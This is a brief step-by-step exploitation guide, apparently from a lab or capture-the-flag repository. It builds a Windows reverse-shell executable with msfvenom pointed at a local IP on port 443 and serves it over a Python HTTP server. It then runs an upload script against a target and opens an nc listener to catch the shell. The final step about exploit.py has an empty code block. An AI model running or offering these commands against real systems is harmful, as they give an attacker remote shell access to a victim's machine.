1. make revshell exe file
   
   ```
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.168.139 LPORT=443 -f exe > weinrev.exe
   ```
2. Run a python server on this directory
   ```
   python3 -m http.server 80
   ```
3. Edit upload.py at line 119 and run
   ```
   python2 upload.py target_ip
   ```
4. Run a nc for getting reverse shell
   ```
   nc -lnvp 443
   ```
5. Edit exploit.py at line 119 and run
   ```

   ```
